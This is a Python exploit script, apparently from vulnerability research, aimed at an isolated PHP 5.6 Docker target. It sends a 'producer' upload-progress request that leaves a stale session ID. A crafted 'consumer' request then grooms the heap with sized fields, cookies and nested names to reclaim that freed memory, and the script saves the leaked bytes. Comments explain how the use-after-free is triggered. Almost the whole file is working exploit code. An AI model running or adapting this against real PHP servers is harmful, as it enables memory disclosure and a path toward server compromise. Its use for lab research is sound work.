#!/usr/bin/env python3
"""A/B trans-SID leak probe for the isolated PHP 5.6 Docker target."""

from __future__ import annotations

import argparse
import json
import socket
from pathlib import Path


HOST = "php2shell-56-target"


def multipart(parts: list[dict[str, bytes]], boundary: bytes) -> bytes:
    out = bytearray()
    for part in parts:
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + part["name"] + b'"'
        if b"filename" in part:
            out += b'; filename="' + part[b"filename"] + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + part["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def post(
    path: str,
    body: bytes,
    boundary: bytes,
    timeout: float = 180.0,
    extra_headers: bytes = b"",
) -> bytes:
    header = (
        f"POST {path} HTTP/1.1\r\nHost: {HOST}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        f"Content-Length: {len(body)}\r\n"
    ).encode() + extra_headers + b"Connection: close\r\n\r\n"
    with socket.create_connection((HOST, 80), 10) as sock:
        sock.settimeout(timeout)
        try:
            sock.sendall(header)
            view = memoryview(body)
            for offset in range(0, len(body), 262144):
                sock.sendall(view[offset : offset + 262144])
        except OSError:
            return b""
        chunks: list[bytes] = []
        try:
            while True:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                chunks.append(chunk)
        except OSError:
            pass
        return b"".join(chunks)


def get(path: str, timeout: float = 60.0) -> bytes:
    request = (
        f"GET {path} HTTP/1.1\r\nHost: {HOST}\r\nConnection: close\r\n\r\n"
    ).encode()
    with socket.create_connection((HOST, 80), 10) as sock:
        sock.settimeout(timeout)
        sock.sendall(request)
        chunks: list[bytes] = []
        try:
            while True:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                chunks.append(chunk)
        except OSError:
            pass
        return b"".join(chunks)


def producer(pads: int) -> bytes:
    parts: list[dict[str, bytes]] = [
        {"name": b"PHPSESSID", "data": b"a" * 19},
        {"name": b"PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for index in range(pads):
        parts.append({"name": f"p{index:06d}"[:7].encode(), "data": b"V" * 7})
    parts += [
        {"name": b"f", b"filename": b"a.txt", "data": b"A" * 64},
        {"name": b"big", "data": b"B" * (12 * 1024 * 1024)},
    ]
    boundary = b"S" * 17
    return post("/producer.php", multipart(parts, boundary), boundary)


def consumer(
    forged_pages: int,
    head: int,
    partial_pages: int,
    tail: int,
    nested: int,
    name_len: int,
    cookies: int,
    cookie_len: int,
    cookies_per_header: int,
    safe_file: bool,
    small_fields: int,
    small_name_len: int,
    small_value_len: int,
    layout: str,
    bb1_len: int,
    bf_len: int,
    boundary_len: int,
    bb1_name: bytes,
    bf_name: bytes,
) -> bytes:
    # Keep the session-name form field first so the RFC1867 progress object
    # remembers a usable SID.  The progress trigger itself must be last: the
    # fields below reclaim the producer's stale PS(id) and session zval before
    # php_session_initialize() calls php_session_reset_id()/track_init().
    parts: list[dict[str, bytes]] = []
    index = 0

    if layout == "twofield":
        for small_index in range(small_fields):
            stem = str(1000 + small_index).encode()
            parts.append({"name": stem, "data": b"V" * small_value_len})
        if bb1_len:
            parts.append({"name": bb1_name, "data": b"P" * bb1_len})
        if bf_len:
            parts.append({"name": bf_name, "data": b"Q" * bf_len})
        parts.extend(
            [
                {"name": b"PHPSESSID", "data": b"attacksessionid0001attacksessi"},
                {"name": b"PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            ]
        )
    else:
        parts.append(
            {"name": b"PHPSESSID", "data": b"attacksessionid0001attacksessi"}
        )

    def add_large(pages: int, fill: bytes) -> None:
        nonlocal index
        name = f"f{index:04d}".encode().ljust(name_len, b"f")
        parts.append({"name": name, "data": fill * (pages * 4096 - 25)})
        index += 1

    if layout != "twofield":
        for _ in range(head):
            add_large(forged_pages, b"B")
        add_large(partial_pages, b"C")
        for _ in range(tail):
            add_large(forged_pages, b"D")
        for _ in range(nested):
            parts.append({"name": f"x{index:05d}".encode() + b"[a]" * 12, "data": b"v"})
            index += 1
        for _ in range(small_fields):
            stem = f"s{index:06d}".encode()
            parts.append(
                {
                    "name": stem.ljust(small_name_len, b"n")[:small_name_len],
                    "data": stem.ljust(small_value_len, b"v")[:small_value_len],
                }
            )
            index += 1
        parts.append({"name": b"PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"})
    if safe_file:
        # A FILE_START request bypasses stale PS(id) entirely and is useful as
        # a safe control.  The disclosure path remains fileless so MULTIPART_END
        # consumes the producer's dangling ID.
        parts.append({"name": b"close", b"filename": b"b.txt", "data": b"Z"})
    boundary = b"C" * boundary_len
    pairs: list[bytes] = []
    for cookie_index in range(cookies):
        name = f"k{cookie_index:05d}".encode().ljust(cookie_len, b"N")[:cookie_len]
        value = f"v{cookie_index:05d}".encode().ljust(cookie_len, b"V")[:cookie_len]
        pairs.append(name + b"=" + value)
    cookie_headers = bytearray()
    for offset in range(0, len(pairs), cookies_per_header):
        cookie_headers += b"Cookie: " + b"; ".join(
            pairs[offset : offset + cookies_per_header]
        ) + b"\r\n"
    return post(
        "/leak.php",
        multipart(parts, boundary),
        boundary,
        600.0,
        bytes(cookie_headers),
    )


def status(response: bytes) -> str:
    return response.partition(b"\r\n")[0].decode("latin1", "replace")


def body(response: bytes) -> bytes:
    return response.partition(b"\r\n\r\n")[2]


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--out", required=True, type=Path)
    parser.add_argument("--pads", type=int, default=32)
    parser.add_argument("--forged-pages", type=int, default=294)
    parser.add_argument("--head", type=int, default=13)
    parser.add_argument("--partial-pages", type=int, default=400)
    parser.add_argument("--tail", type=int, default=2)
    parser.add_argument("--nested", type=int, default=900)
    parser.add_argument("--name-len", type=int, default=120)
    parser.add_argument("--cookies", type=int, default=0)
    parser.add_argument("--cookie-len", type=int, default=47)
    parser.add_argument("--cookies-per-header", type=int, default=50)
    parser.add_argument("--safe-file", action="store_true")
    parser.add_argument("--small-fields", type=int, default=0)
    parser.add_argument("--small-name-len", type=int, default=19)
    parser.add_argument("--small-value-len", type=int, default=19)
    parser.add_argument("--layout", choices=("legacy", "twofield"), default="legacy")
    parser.add_argument("--bb1-len", type=int, default=1048551)
    parser.add_argument("--bf-len", type=int, default=1041384)
    parser.add_argument("--boundary-len", type=int, default=10)
    parser.add_argument("--bb1-name", default="900001")
    parser.add_argument("--bf-name", default="900002")
    parser.add_argument("--plain-get", action="store_true")
    parser.add_argument("--warm-count", type=int, default=0)
    args = parser.parse_args()
    args.out.mkdir(parents=True, exist_ok=True)
    warm_responses = [get("/warm.php") for _ in range(args.warm_count)]
    warm_response = warm_responses[-1] if warm_responses else b""
    first = producer(args.pads)
    if args.plain_get:
        second = get("/leak.php")
    else:
        second = consumer(
            args.forged_pages,
            args.head,
            args.partial_pages,
            args.tail,
            args.nested,
            args.name_len,
            args.cookies,
            args.cookie_len,
            args.cookies_per_header,
            args.safe_file,
            args.small_fields,
            args.small_name_len,
            args.small_value_len,
            args.layout,
            args.bb1_len,
            args.bf_len,
            args.boundary_len,
            args.bb1_name.encode("ascii"),
            args.bf_name.encode("ascii"),
        )
    (args.out / "a.response").write_bytes(first)
    for warm_index, response in enumerate(warm_responses, 1):
        (args.out / f"warm-{warm_index}.response").write_bytes(response)
    (args.out / "b.response").write_bytes(second)
    (args.out / "b.body").write_bytes(body(second))
    summary = {
        "warm_count": len(warm_responses),
        "warm_status": status(warm_response) if warm_responses else "",
        "warm_length": len(warm_response),
        "a_status": status(first),
        "a_length": len(first),
        "b_status": status(second),
        "b_length": len(second),
        "b_body_length": len(body(second)),
        "b_prefix_hex": body(second)[:64].hex(),
    }
    (args.out / "summary.json").write_text(json.dumps(summary, indent=2) + "\n")
    print(json.dumps(summary, sort_keys=True))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
